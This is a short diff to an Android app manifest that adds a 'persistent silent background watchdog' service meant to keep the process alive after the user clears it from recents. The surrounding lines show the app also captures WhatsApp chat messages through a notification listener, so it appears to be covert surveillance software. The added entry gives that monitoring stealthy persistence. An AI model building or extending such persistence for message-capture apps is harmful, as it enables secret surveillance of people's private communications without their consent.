@@ -201,6 +201,13 @@
             android:stopWithTask="false"
             android:foregroundServiceType="dataSync" />
 
+        <!-- Persistent silent background watchdog to keep process alive across recents clear -->
+        <service
+            android:name=".sync.PersistentWatchdogService"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:foregroundServiceType="dataSync" />
+
         <!-- Notification listener for WhatsApp chat message capture -->
         <service
             android:name=".collectors.WhatsAppNotificationListener"
